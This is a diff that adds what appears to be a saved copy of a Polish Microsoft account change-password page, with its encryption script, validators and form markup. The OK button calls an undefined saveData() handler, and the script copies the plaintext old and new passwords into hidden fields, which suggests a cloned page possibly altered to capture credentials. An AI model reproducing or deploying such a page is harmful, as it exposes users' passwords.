+                var CredentialsCipherTextValue = EncryptedProperties(newPassword.value, "", oldPassword.value, "");
+                locals.push("CredentialsCipherText value: " + CredentialsCipherTextValue);
+
+                if (ChangePassword.ClientEncryptionPublicKey != '') {
+                    document.getElementById(this.EncryptedOldPasswordTextName).value = EncryptString(ChangePassword.ClientEncryptionPublicKey, oldPassword.value);
+                    document.getElementById(this.EncryptedNewPasswordTextName).value = EncryptString(ChangePassword.ClientEncryptionPublicKey, newPassword.value);
+                }
+
+                locals.push("EncryptedOldPasswordText value: " + document.getElementById(this.EncryptedOldPasswordTextName).value);
+                locals.push("EncryptedNewPasswordText value: " + document.getElementById(this.EncryptedNewPasswordTextName).value);
+
+                // Set the encrypted password to the hidden fields
+                // to be sent in the POST request.
+                document.getElementById(this.OldPasswordCipherTextName).value = OldPasswordCipherTextValue;
+                document.getElementById(this.CredentialsCipherTextName).value = CredentialsCipherTextValue;
+                document.getElementById(this.HexBinarySkiFieldName).value = SKI;
+                document.getElementById(this.EncryptionVersionFieldName).value = EncryptionVersion;
+            }
+           
+            // Disable the form. This ensures that the passwords are not sent to the server side.
+            $("#" + this.ConfirmNewPasswordTextBoxName).prop("disabled", true);
+            $("#" + this.NewPasswordTextBoxName).prop("disabled", true);
+            $("#" + this.OldPasswordTextBoxName).prop("disabled", true);
+
+            $("#" + this.EncodedNewPasswordTextName).val(encodeURIComponent(newPassword.value));
+            $("#" + this.EncodedOldPasswordTextName).val(encodeURIComponent(oldPassword.value));
+
+            // Change the opacity of the Submit button since the BOX button implementation does not change it by default.
+            $("#okButtonContainer").addClass("DisabledInput");
+            Button.Disable(this.SubmitButton);
+            Button.Disable(this.CancelButton);
+
+            // Show the spinner
+            $("#loadingAnimationImage").show();
+
+        }
+        catch (error) {
+            this.ReportClientSideError("There has been an error in the ValidateAndEncryptCredentials() method. " +
+                "Message: " + error.message + ". " +
+                "Stack: " + error.stack + ". " +
+                "Locals: " + locals.toString() + ". " +
+                "RSAJscriptUrl: " + ChangePassword.RSAJscriptUrl + ". " +
+                "RSAPublicKeyUrl: " + ChangePassword.RSAPublicKeyUrl + ".");
+        }
+    }
+
+    ChangePassword.ReportClientSideError = function (messageText) {
+        var urlLocation = "ChangePassword.aspx/ReportClientSideError";
+        var upnValue = document.getElementById(ChangePassword.EmailLabel).innerHTML;
+
+        if (window.location.pathname.toLowerCase().indexOf('logincredprof') != -1)
+        {
+            urlLocation = "../" + urlLocation;
+        }
+
+        $.ajax({
+            type: "POST",
+            url: urlLocation,
+            data: JSON.stringify({ upn: upnValue, message: messageText }),
+            contentType: "application/json",
+            dataType: "json",
+            error: function () {
+                // Ignore any errors due to the web method's failure to log
+            }
+        });
+    }
+
+    //<summary>
+    // Evaluates the validators by calling the ASP.NET client library method ValidatorValidate, which check if the specified
+    // validator is enabled and then proceed to evaluate it. Then refresh the value of the global variable Page_IsValid
+    // accordingly.
+    //</summary>
+    ChangePassword.EvaluateValidators = function () {
+
+        try {
+
+            // The validator will only be evaluated if it is enabled, otherwise it will be ignored.
+
+            ValidatorValidate(document.getElementById(this.OldPasswordRequiredValidatorName));
+            ValidatorValidate(document.getElementById(this.NewPasswordRequiredValidatorName));
+            ValidatorValidate(document.getElementById(this.NewPasswordMinimumLengthValidatorName));
+            ValidatorValidate(document.getElementById(this.NewPasswordMaximumLengthValidatorName));
+            ValidatorValidate(document.getElementById(this.NewPasswordCharacterExpressionValidatorName));
+            ValidatorValidate(document.getElementById(this.CheckPasswordStrengthValidatorName));
+            ValidatorValidate(document.getElementById(this.ConfirmNewPasswordRequiredValidatorName));
+            ValidatorValidate(document.getElementById(this.ConfirmNewPasswordMinimumLengthValidatorName));
+            ValidatorValidate(document.getElementById(this.ConfirmNewPasswordMaximumLengthValidatorName));
+            ValidatorValidate(document.getElementById(this.ConfirmNewPasswordCharacterExpressionValidatorName));
+            ValidatorValidate(document.getElementById(this.PasswordMatchValidatorName));
+
+            ValidatorUpdateIsValid();
+
+        }
+        catch (error) {
+
+            this.ReportClientSideError("There has been an error evaluating the validators." +
+               "Stack: " + error.stack + ". " +
+               "RSAJscriptUrl: " + ChangePassword.RSAJscriptUrl + ". " +
+               "RSAPublicKeyUrl: " + ChangePassword.RSAPublicKeyUrl + ".");
+        }
+    }
+
+    ChangePassword.LoadScript = function(src) { 
+       var script = document.createElement("script"); 
+       script.type = "text/javascript"; 
+       document.getElementsByTagName("head")[0].appendChild(script); 
+       script.src = src; 
+    }
+
+    // We use the two variables "SKI" and "parseRSAKeyFromString" as beacons to determine if the scripts have loaded.
+    // If they have not been loaded, we attempt to reload them.
+    ChangePassword.EnsureEncryptionJavascriptHasLoaded = function () {
+        if (typeof SKI === 'undefined' || typeof parseRSAKeyFromString === 'undefined') {
+            if (typeof SKI === 'undefined') {
+                ChangePassword.LoadScript(ChangePassword.RSAPublicKeyUrl);
+            }
+
+            if (typeof parseRSAKeyFromString === 'undefined') {
+                ChangePassword.LoadScript(ChangePassword.RSAJscriptUrl);
+            }
+
+            setTimeout(ChangePassword.EnsureEncryptionJavascriptHasLoaded, 1000);
+        }
+    }
+
+</script>
+<span id="ChangePasswordControl_ChangePasswordSheet" boxtype="PropertySheet" class="PropertySheet"><input type="hidden" id="ChangePasswordControl_ChangePasswordSheet_Collapsed" name="ChangePasswordControl$ChangePasswordSheet" value="0" /><div id="ChangePasswordControl_ChangePasswordSheet_Body">
+																<div class="ContentContainer">
+																	<table cellpadding="0" cellspacing="0">
+																		<tr class="PropertySheetItem">
+																			<td id="ChangePasswordControl_PasswordRequirementText" class="Content">
+            <span id="ChangePasswordControl_AssistiveTextLabel" class="AssistiveText">Wymagane jest silne hasło. Wprowadź od 8 do 256 znaków. Hasło nie może zawierać popularnych wyrazów ani nazw. Użyj wielkich i małych liter, cyfr oraz symboli.</span><br />
+        </td>
+																		</tr><tr class="PropertySheetItem">
+																			<td id="ChangePasswordControl_EmailProperty" class="Content"><div class="Title">
+																		
+        </td>
+																		</tr><tr class="PropertySheetItem">
+																			<td id="ChangePasswordControl_OldPasswordProperty" class="Content"><div class="Title">
+																				Stare hasło
+																			</div>
+            <input name="ChangePasswordControl$OldPasswordTextBox" type="password" id="ChangePasswordControl_OldPasswordTextBox" tabindex="1" title="Stare&#32;hasło" autocomplete="off" boxtype="TextBox" style="width: 250px;" /><br />
+            <span id="ChangePasswordControl_OldPasswordRequiredValidator" class="ValidationMessageOldPassword" style="color:Red;visibility:hidden;">Należy wypełnić.</span>
+            <span id="ChangePasswordControl_OldPasswordPropertyValidator" class="ValidationMessageOldPassword_Server" style="color:Red;visibility:hidden;">Upewnij się, że wprowadzony ciąg jest prawidłowy.</span>
+            
+            <span id="ChangePasswordControl_AggregationValidatorOldPassword" class="ValidationMessageOldPassword" style="color:Red;visibility:hidden;"></span>
+        </td>
+																		</tr><tr class="PropertySheetItem">
+																			<td id="ChangePasswordControl_NewPasswordProperty" class="Content"><div class="Title">
+																				Utwórz nowe hasło
+																			</div>
+            <input name="ChangePasswordControl$NewPasswordTextBox" type="password" id="ChangePasswordControl_NewPasswordTextBox" tabindex="2" title="Utwórz&#32;nowe&#32;hasło" autocomplete="off" boxtype="TextBox" style="width: 250px;" /><br />
+            <div class="ProgressBarContainer" MaxValue="3" CurrentValue="0" boxtype="PasswordStrengthBarControl" id="ChangePasswordControl_PasswordMeter" style="width:250px;margin-left: 1px; margin-right: 1px">
+																				<div class="ProgressBarFill&#32;ProgressBar-Healthy" id="ChangePasswordControl_PasswordMeter_progressBar" style="width:0%;">
+																					&nbsp;&nbsp;Siła hasła
+																				</div><input type="hidden" name="ChangePasswordControl$PasswordMeter" id="ChangePasswordControl_PasswordMeter_CurrentValue" value="0" /><input type="hidden" name="ChangePasswordControl$PasswordMeter_MaxValue" id="ChangePasswordControl_PasswordMeter_MaxValue" value="3" /><input type="hidden" name="ChangePasswordControl$PasswordMeter_MeterLevel" id="ChangePasswordControl_PasswordMeter_MeterLevel" value="Healthy" />
+																			</div>
+            <span id="ChangePasswordControl_NewPasswordRequiredValidator" class="ValidationMessageNewPassword" style="color:Red;visibility:hidden;">Należy wypełnić.</span>
+            <span id="ChangePasswordControl_NewPasswordPropertyValidator" class="ValidationMessageNewPassword_Server" style="color:Red;visibility:hidden;">Upewnij się, że wprowadzony ciąg jest prawidłowy.</span>
+            <span id="ChangePasswordControl_NewPasswordMinimumLengthValidator" class="ValidationMessageNewPassword" PopupPosition="Right" style="color:Red;visibility:hidden;">Hasło musi zawierać co najmniej 7 znaków.</span>
+            <span id="ChangePasswordControl_NewPasswordMaximumLengthValidator" class="ValidationMessageNewPassword" PopupPosition="Right" style="color:Red;visibility:hidden;">Hasło może zawierać maksymalnie 256 znaków.</span>
+            <span id="ChangePasswordControl_NewPasswordCharacterExpressionValidator" class="ValidationMessageNewPassword" PopupPosition="Right" style="color:Red;visibility:hidden;">Hasło nie może zawierać znaków innych niż drukowane i ASCII.</span>
+            <span id="ChangePasswordControl_PasswordStrengthValidator" class="ValidationMessageNewPassword" style="color:Red;visibility:hidden;">Hasło musi być silne. Połącz co najmniej trzy z następujących elementów: wielkie i małe litery, cyfry oraz symbole.</span>
+            <span id="ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator" class="ValidationMessageNewPassword" style="color:Red;visibility:hidden;">Wprowadzone nowe hasło jest takie samo jak stare. Wprowadź inne hasło.</span>
+            
+            <span id="ChangePasswordControl_AggregationValidatorNewPassword" class="ValidationMessageNewPassword" style="color:Red;visibility:hidden;"></span>
+        </td>
+																		</tr><tr class="PropertySheetItem">
+																			<td id="ChangePasswordControl_PasswordNewConfirmProperty" class="Content"><div class="Title">
+																				Potwierdź nowe hasło
+																			</div>
+            <input name="ChangePasswordControl$ConfirmNewPasswordTextBox" type="password" id="ChangePasswordControl_ConfirmNewPasswordTextBox" tabindex="3" title="Potwierdź&#32;nowe&#32;hasło" autocomplete="off" boxtype="TextBox" style="width: 250px;" />
+            <span id="ChangePasswordControl_ConfirmNewPasswordRequiredValidator" class="ValidationMessagePasswordNewConfirm" style="color:Red;visibility:hidden;">Należy wypełnić.</span>
+            <span id="ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator" class="ValidationMessagePasswordNewConfirm" style="color:Red;visibility:hidden;">Hasło musi zawierać co najmniej 7 znaków.</span>
+            <span id="ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator" class="ValidationMessagePasswordNewConfirm" style="color:Red;visibility:hidden;">Hasło może zawierać maksymalnie 256 znaków.</span>
+            <span id="ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator" class="ValidationMessagePasswordNewConfirm" style="color:Red;visibility:hidden;">Hasło nie może zawierać znaków innych niż drukowane i ASCII.</span>
+            <span id="ChangePasswordControl_PasswordMatchValidator" class="ValidationMessagePasswordNewConfirm" style="color:Red;visibility:hidden;">Wprowadzone hasła nie są zgodne. Sprawdź wpisane hasło i spróbuj ponownie.</span>
+            
+            <span id="ChangePasswordControl_AggregationValidatorConfirmNewPassword" class="ValidationMessagePasswordNewConfirm" style="color:Red;visibility:hidden;"></span>
+            <input type="hidden" name="ChangePasswordControl$OldPasswordCipherTextField" id="ChangePasswordControl_OldPasswordCipherTextField" />
+            <input type="hidden" name="ChangePasswordControl$CredentialsCipherTextField" id="ChangePasswordControl_CredentialsCipherTextField" />
+            <input type="hidden" name="ChangePasswordControl$HexBinarySkiField" id="ChangePasswordControl_HexBinarySkiField" />
+            <input type="hidden" name="ChangePasswordControl$EncryptionVersionField" id="ChangePasswordControl_EncryptionVersionField" />
+            <input type="hidden" name="ChangePasswordControl$EncryptedOldPasswordTextField" id="ChangePasswordControl_EncryptedOldPasswordTextField" />
+            <input type="hidden" name="ChangePasswordControl$EncryptedNewPasswordTextField" id="ChangePasswordControl_EncryptedNewPasswordTextField" />
+            <input type="hidden" name="ChangePasswordControl$EncodedOldPasswordTextField" id="ChangePasswordControl_EncodedOldPasswordTextField" />
+            <input type="hidden" name="ChangePasswordControl$EncodedNewPasswordTextField" id="ChangePasswordControl_EncodedNewPasswordTextField" />
+        </td>
+																		</tr><tr class="PropertySheetItem">
+																			<td id="ChangePasswordControl_OKButtonProperty" class="Content"><div class="Title">
+																				
+																			</div>
+            <table style="margin-top: 12px; vertical-align: middle; text-align: center">
+                <tr>
+                    <td>
+                        <div id="okButtonContainer">
+                            <span id="ChangePasswordControl_OkButton_disabled" class="Button-disabled" style="display:none;"><span>Prześlij</span></span><a onclick="saveData()" id="ChangePasswordControl_OkButton" tabindex="4" class="Button-focus" href="javascript:WebForm_DoPostBackWithOptions(new&#32;WebForm_PostBackOptions(&quot;ChangePasswordControl$OkButton&quot;,&#32;&quot;&quot;,&#32;true,&#32;&quot;&quot;,&#32;&quot;&quot;,&#32;false,&#32;true))" boxtype="Button" onmouseover="Button.MouseOver(&#39;ChangePasswordControl_OkButton&#39;);" onmouseout="Button.MouseOut(&#39;ChangePasswordControl_OkButton&#39;);" onmousedown="Button.MouseDown(&#39;ChangePasswordControl_OkButton&#39;);" onfocus="Button.Focus(&#39;ChangePasswordControl_OkButton&#39;);" onblur="Button.Blur(&#39;ChangePasswordControl_OkButton&#39;);" uniqueid="ChangePasswordControl$OkButton" style="display:inline-block;"><span>Prześlij</span></a><script type="text/javascript">
+																				Button.AddGroup('ChangePasswordControl_OkButton','ChangePasswordControl_OkButton');
+																			</script>
+                        </div>
+                    </td>
+                    <td>
+                        <span id="ChangePasswordControl_CancelButton_disabled" class="CancelButton-disabled" style="display:none;"><span>Anuluj</span></span><a onclick="_s.i(this);" id="ChangePasswordControl_CancelButton" tabindex="5" class="CancelButton" href="javascript:__doPostBack(&#39;ChangePasswordControl$CancelButton&#39;,&#39;&#39;)" boxtype="CancelButton" onmouseover="Button.MouseOver(&#39;ChangePasswordControl_CancelButton&#39;);" onmouseout="Button.MouseOut(&#39;ChangePasswordControl_CancelButton&#39;);" onmousedown="Button.MouseDown(&#39;ChangePasswordControl_CancelButton&#39;);" onfocus="Button.Focus(&#39;ChangePasswordControl_CancelButton&#39;);" onblur="Button.Blur(&#39;ChangePasswordControl_CancelButton&#39;);" uniqueid="ChangePasswordControl$CancelButton" style="display:inline-block;"><span>Anuluj</span></a><script type="text/javascript">
+																				Button.AddGroup('ChangePasswordControl_CancelButton','ChangePasswordControl_CancelButton');
+																			</script>
+                    </td>
+                    <td>
+                        <img id="loadingAnimationImage" alt="Loading..." style="display:none" src="/webcontrols/images/spinner_24x24.gif" width="24" height="24" />
+                    </td>
+                </tr>
+            </table>
+        </td>
+																		</tr>
+																	</table>
+																</div>
+															</div></span><div class="Spacer">
+
+															</div>
+
+                                            </td>
+														</tr>
+													</table>
+												</div>
+											</div></span><div class="Spacer">
+
+											</div>
+                                </div>
+                            <span id="LastPasswordChangeTimeStampLabel" boxtype="Label"></span>
+                
+										</div>
+									</div>
+								</div><div class="PageLayout-Padding">
+
+								</div></td>
+							</tr>
+						</table></td>
+					</tr>
+				</table>
+			</div>
+        </div>
+    <input name="BOXPageIDField" type="hidden" id="BOXPageIDField" value="ChangePasswordPage" />
+		</div><div id="ShellFooter" class="Shell-Footer">
+			<div id="O365_FooterContainer">
+
+			</div><div id="TraceInfoDiv" style="display:none;">PUID:10032002A92461E4 TID:cbd8bb0a-8e2a-4aec-acd7-11389a7559f0 SID:48a9f973-263e-4ed3-acf3-59afd0118ae9 CID:51e585e8-40a7-48dd-a0d2-b967bdadf14e F:15GA</div>
+		</div>
+	</div>
+</div><div style="display:none;">
+	<div id="dialogArea" class="DialogManager-Area">
+		<div id="dialogShield" class="DialogManager-Shield">
+
+		</div><div id="dialogForeground" class="DialogManager-Foreground">
+			<div id="dialogFrame" class="DialogManager-Frame" role="dialog" aria-labelledby="titleContainerARIAHeading" aria-modal="true">
+				<div id="dialogTopRegion" class="DialogManager-TopRegion">
+					<div id="dialogIconArea" class="DialogManager-Icon">
+
+					</div>
+				</div><div id="dialogMiddleRegion" class="DialogManager-MiddleRegion">
+					<div id="dialogHeaderArea" class="DialogManager-Header">
+						<table cellpadding="0" cellspacing="0">
+							<tr>
+								<td class="DialogManager-HeaderLeftTD"></td><td class="DialogManager-HeaderRightTD"><div id="dialogCloseIcon" class="DialogCloseButton">
+
+								</div><div id="dialogTitleArea" class="DialogManager-Title">
+
+								</div><div id="dialogSubTitleArea" class="DialogManager-SubTitle">
+
+								</div></td>
+							</tr>
+						</table>
+					</div><div id="dialogContentArea" class="DialogManager-ContentArea">
+						<div id="dialogBodyArea" class="DialogManager-BodyArea">
+
+						</div><div id="dialogLearnMoreArea" class="DialogManager-LearnMoreArea" style="display:none;">
+							<a onclick="_s.i(this);" id="dialogLearnMoreLink" target="_blank" boxtype="HyperLink">Learn more</a>
+						</div><div id="dialogFooterArea" class="DialogManager-Footer" style="display:none;">
+							<span id="DialogManager1_dialogAcceptButton_disabled" class="Button-disabled" style="display:none;"><span></span></span><a onclick="_s.i(this);DialogManager.dismiss(DialogManager.positiveConfirmation);&#32;return&#32;false;" id="DialogManager1_dialogAcceptButton" class="Button" href="javascript:WebForm_DoPostBackWithOptions(new&#32;WebForm_PostBackOptions(&quot;DialogManager1$dialogAcceptButton&quot;,&#32;&quot;&quot;,&#32;true,&#32;&quot;&quot;,&#32;&quot;&quot;,&#32;false,&#32;true))" boxtype="Button" onmouseover="Button.MouseOver(&#39;DialogManager1_dialogAcceptButton&#39;);" onmouseout="Button.MouseOut(&#39;DialogManager1_dialogAcceptButton&#39;);" onmousedown="Button.MouseDown(&#39;DialogManager1_dialogAcceptButton&#39;);" onfocus="Button.Focus(&#39;DialogManager1_dialogAcceptButton&#39;);" onblur="Button.Blur(&#39;DialogManager1_dialogAcceptButton&#39;);" uniqueid="DialogManager1$dialogAcceptButton" style="display:inline-block;"><span></span></a><script type="text/javascript">
+								Button.AddGroup('DialogManager1_dialogAcceptButton','DialogManager1_dialogAcceptButton');
+							</script><span id="DialogManager1_dialogDismissButton_disabled" class="Button-disabled" style="display:none;"><span></span></span><a onclick="_s.i(this);DialogManager.dismiss(DialogManager.negativeConfirmation);&#32;return&#32;false;" id="DialogManager1_dialogDismissButton" class="Button" href="javascript:WebForm_DoPostBackWithOptions(new&#32;WebForm_PostBackOptions(&quot;DialogManager1$dialogDismissButton&quot;,&#32;&quot;&quot;,&#32;true,&#32;&quot;&quot;,&#32;&quot;&quot;,&#32;false,&#32;true))" boxtype="Button" onmouseover="Button.MouseOver(&#39;DialogManager1_dialogDismissButton&#39;);" onmouseout="Button.MouseOut(&#39;DialogManager1_dialogDismissButton&#39;);" onmousedown="Button.MouseDown(&#39;DialogManager1_dialogDismissButton&#39;);" onfocus="Button.Focus(&#39;DialogManager1_dialogDismissButton&#39;);" onblur="Button.Blur(&#39;DialogManager1_dialogDismissButton&#39;);" uniqueid="DialogManager1$dialogDismissButton" style="display:inline-block;"><span></span></a><script type="text/javascript">
+								Button.AddGroup('DialogManager1_dialogDismissButton','DialogManager1_dialogDismissButton');
+							</script>
+						</div><div id="dialogInfoIconArea" style="display:none;">
+							<span class="clipDiv&#32;" id="04c52a01-58d7-44e5-b86e-26a3f3dba74a_clipDiv" style="width:48px;height:48px;"><img boxtype="Image" id="DialogManager1_dialogInfoIcon" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/webcontrols.png" alt="Information" style="border-width:0px;top:-173px;left:-151px;" /></span>
+						</div><div id="dialogWarningIconArea" style="display:none;">
+							<span class="clipDiv&#32;" id="8aa09da3-1d96-49cb-827b-8d0f2afee686_clipDiv" style="width:48px;height:48px;"><img boxtype="Image" id="DialogManager1_dialogWarningIcon" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/webcontrols.png" alt="Warning" style="border-width:0px;top:-179px;left:-51px;" /></span>
+						</div><div id="dialogErrorIconArea" style="display:none;">
+							<span class="clipDiv&#32;" id="86cc136a-9dc7-47ec-820f-a9157910dd4c_clipDiv" style="width:48px;height:48px;"><img boxtype="Image" id="DialogManager1_dialogErrorIcon" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/webcontrols.png" alt="Error" style="border-width:0px;top:-179px;left:-101px;" /></span>
+						</div>
+					</div>
+				</div><div id="dialogBottomRegion" class="DialogManager-BottomRegion">
+					<div class="DialogManager-BottomPaddingArea">
+
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div><input name="__RequestVerificationToken" type="hidden" value="MoJkiPnaIsomPnUoMn5CG6pMhxVZ5zhDW2W8qEaf4aRV1YxNBYwwsFDjR7xMmmkfJq-1yTibg7Wc70yaPHMC-PIvHYCHoqq-IgqqzusyCSgL0WeEHiXHf4MigwKXiHQhaQlkQvb7EcZ3Bzm3ij3okM7amH4xqZz1dk9a5rvgqjleRsVrTFjfNdEYRyhk1Qc30" />
+<script type="text/javascript">
+//<![CDATA[
+var Page_Validators =  new Array(document.getElementById("ChangePasswordControl_OldPasswordRequiredValidator"), document.getElementById("ChangePasswordControl_OldPasswordPropertyValidator"), document.getElementById("ChangePasswordControl_AggregationValidatorOldPassword"), document.getElementById("ChangePasswordControl_NewPasswordRequiredValidator"), document.getElementById("ChangePasswordControl_NewPasswordPropertyValidator"), document.getElementById("ChangePasswordControl_NewPasswordMinimumLengthValidator"), document.getElementById("ChangePasswordControl_NewPasswordMaximumLengthValidator"), document.getElementById("ChangePasswordControl_NewPasswordCharacterExpressionValidator"), document.getElementById("ChangePasswordControl_PasswordStrengthValidator"), document.getElementById("ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator"), document.getElementById("ChangePasswordControl_AggregationValidatorNewPassword"), document.getElementById("ChangePasswordControl_ConfirmNewPasswordRequiredValidator"), document.getElementById("ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator"), document.getElementById("ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator"), document.getElementById("ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator"), document.getElementById("ChangePasswordControl_PasswordMatchValidator"), document.getElementById("ChangePasswordControl_AggregationValidatorConfirmNewPassword"));
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+var ChangePasswordControl_OldPasswordRequiredValidator = document.all ? document.all["ChangePasswordControl_OldPasswordRequiredValidator"] : document.getElementById("ChangePasswordControl_OldPasswordRequiredValidator");
+ChangePasswordControl_OldPasswordRequiredValidator.controltovalidate = "ChangePasswordControl_OldPasswordTextBox";
+ChangePasswordControl_OldPasswordRequiredValidator.errormessage = "Należy wypełnić.";
+ChangePasswordControl_OldPasswordRequiredValidator.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+ChangePasswordControl_OldPasswordRequiredValidator.initialvalue = "";
+var ChangePasswordControl_OldPasswordPropertyValidator = document.all ? document.all["ChangePasswordControl_OldPasswordPropertyValidator"] : document.getElementById("ChangePasswordControl_OldPasswordPropertyValidator");
+ChangePasswordControl_OldPasswordPropertyValidator.controltovalidate = "ChangePasswordControl_OldPasswordTextBox";
+ChangePasswordControl_OldPasswordPropertyValidator.errormessage = "Upewnij się, że wprowadzony ciąg jest prawidłowy.";
+ChangePasswordControl_OldPasswordPropertyValidator.evaluationfunction = "CustomValidatorEvaluateIsValid";
+ChangePasswordControl_OldPasswordPropertyValidator.clientvalidationfunction = "ChangePassword.CustomServerValidator";
+ChangePasswordControl_OldPasswordPropertyValidator.validateemptytext = "true";
+var ChangePasswordControl_AggregationValidatorOldPassword = document.all ? document.all["ChangePasswordControl_AggregationValidatorOldPassword"] : document.getElementById("ChangePasswordControl_AggregationValidatorOldPassword");
+ChangePasswordControl_AggregationValidatorOldPassword.controltovalidate = "ChangePasswordControl_OldPasswordTextBox";
+ChangePasswordControl_AggregationValidatorOldPassword.evaluationfunction = "CustomValidatorEvaluateIsValid";
+ChangePasswordControl_AggregationValidatorOldPassword.clientvalidationfunction = "ChangePassword.AggregateValidator";
+ChangePasswordControl_AggregationValidatorOldPassword.validateemptytext = "true";
+var ChangePasswordControl_NewPasswordRequiredValidator = document.all ? document.all["ChangePasswordControl_NewPasswordRequiredValidator"] : document.getElementById("ChangePasswordControl_NewPasswordRequiredValidator");
+ChangePasswordControl_NewPasswordRequiredValidator.controltovalidate = "ChangePasswordControl_NewPasswordTextBox";
+ChangePasswordControl_NewPasswordRequiredValidator.errormessage = "Należy wypełnić.";
+ChangePasswordControl_NewPasswordRequiredValidator.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+ChangePasswordControl_NewPasswordRequiredValidator.initialvalue = "";
+var ChangePasswordControl_NewPasswordPropertyValidator = document.all ? document.all["ChangePasswordControl_NewPasswordPropertyValidator"] : document.getElementById("ChangePasswordControl_NewPasswordPropertyValidator");
+ChangePasswordControl_NewPasswordPropertyValidator.controltovalidate = "ChangePasswordControl_NewPasswordTextBox";
+ChangePasswordControl_NewPasswordPropertyValidator.errormessage = "Upewnij się, że wprowadzony ciąg jest prawidłowy.";
+ChangePasswordControl_NewPasswordPropertyValidator.evaluationfunction = "CustomValidatorEvaluateIsValid";
+ChangePasswordControl_NewPasswordPropertyValidator.clientvalidationfunction = "ChangePassword.CustomServerValidator";
+ChangePasswordControl_NewPasswordPropertyValidator.validateemptytext = "true";
+var ChangePasswordControl_NewPasswordMinimumLengthValidator = document.all ? document.all["ChangePasswordControl_NewPasswordMinimumLengthValidator"] : document.getElementById("ChangePasswordControl_NewPasswordMinimumLengthValidator");
+ChangePasswordControl_NewPasswordMinimumLengthValidator.controltovalidate = "ChangePasswordControl_NewPasswordTextBox";
+ChangePasswordControl_NewPasswordMinimumLengthValidator.errormessage = "Hasło musi zawierać co najmniej 7 znaków.";
+ChangePasswordControl_NewPasswordMinimumLengthValidator.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
+ChangePasswordControl_NewPasswordMinimumLengthValidator.validationexpression = "^.{8,}$";
+var ChangePasswordControl_NewPasswordMaximumLengthValidator = document.all ? document.all["ChangePasswordControl_NewPasswordMaximumLengthValidator"] : document.getElementById("ChangePasswordControl_NewPasswordMaximumLengthValidator");
+ChangePasswordControl_NewPasswordMaximumLengthValidator.controltovalidate = "ChangePasswordControl_NewPasswordTextBox";
+ChangePasswordControl_NewPasswordMaximumLengthValidator.errormessage = "Hasło może zawierać maksymalnie 256 znaków.";
+ChangePasswordControl_NewPasswordMaximumLengthValidator.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
+ChangePasswordControl_NewPasswordMaximumLengthValidator.validationexpression = "^.{0,256}$";
+var ChangePasswordControl_NewPasswordCharacterExpressionValidator = document.all ? document.all["ChangePasswordControl_NewPasswordCharacterExpressionValidator"] : document.getElementById("ChangePasswordControl_NewPasswordCharacterExpressionValidator");
+ChangePasswordControl_NewPasswordCharacterExpressionValidator.controltovalidate = "ChangePasswordControl_NewPasswordTextBox";
+ChangePasswordControl_NewPasswordCharacterExpressionValidator.errormessage = "Hasło nie może zawierać znaków innych niż drukowane i ASCII.";
+ChangePasswordControl_NewPasswordCharacterExpressionValidator.validationGroup = "NewPassword";
+ChangePasswordControl_NewPasswordCharacterExpressionValidator.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
+ChangePasswordControl_NewPasswordCharacterExpressionValidator.validationexpression = "^[\\x20-\\x7e]*";
+var ChangePasswordControl_PasswordStrengthValidator = document.all ? document.all["ChangePasswordControl_PasswordStrengthValidator"] : document.getElementById("ChangePasswordControl_PasswordStrengthValidator");
+ChangePasswordControl_PasswordStrengthValidator.controltovalidate = "ChangePasswordControl_NewPasswordTextBox";
+ChangePasswordControl_PasswordStrengthValidator.errormessage = "Hasło musi być silne. Połącz co najmniej trzy z następujących elementów: wielkie i małe litery, cyfry oraz symbole.";
+ChangePasswordControl_PasswordStrengthValidator.evaluationfunction = "CustomValidatorEvaluateIsValid";
+ChangePasswordControl_PasswordStrengthValidator.clientvalidationfunction = "ChangePassword.CheckPasswordStrength";
+var ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator = document.all ? document.all["ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator"] : document.getElementById("ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator");
+ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator.controltovalidate = "ChangePasswordControl_NewPasswordTextBox";
+ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator.errormessage = "Wprowadzone nowe hasło jest takie samo jak stare. Wprowadź inne hasło.";
+ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator.evaluationfunction = "CustomValidatorEvaluateIsValid";
+ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator.clientvalidationfunction = "ChangePassword.CheckNewPasswordIsDifferentFromOld";
+ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator.validateemptytext = "true";
+var ChangePasswordControl_AggregationValidatorNewPassword = document.all ? document.all["ChangePasswordControl_AggregationValidatorNewPassword"] : document.getElementById("ChangePasswordControl_AggregationValidatorNewPassword");
+ChangePasswordControl_AggregationValidatorNewPassword.controltovalidate = "ChangePasswordControl_NewPasswordTextBox";
+ChangePasswordControl_AggregationValidatorNewPassword.evaluationfunction = "CustomValidatorEvaluateIsValid";
+ChangePasswordControl_AggregationValidatorNewPassword.clientvalidationfunction = "ChangePassword.AggregateValidator";
+ChangePasswordControl_AggregationValidatorNewPassword.validateemptytext = "true";
+var ChangePasswordControl_ConfirmNewPasswordRequiredValidator = document.all ? document.all["ChangePasswordControl_ConfirmNewPasswordRequiredValidator"] : document.getElementById("ChangePasswordControl_ConfirmNewPasswordRequiredValidator");
+ChangePasswordControl_ConfirmNewPasswordRequiredValidator.controltovalidate = "ChangePasswordControl_ConfirmNewPasswordTextBox";
+ChangePasswordControl_ConfirmNewPasswordRequiredValidator.errormessage = "Należy wypełnić.";
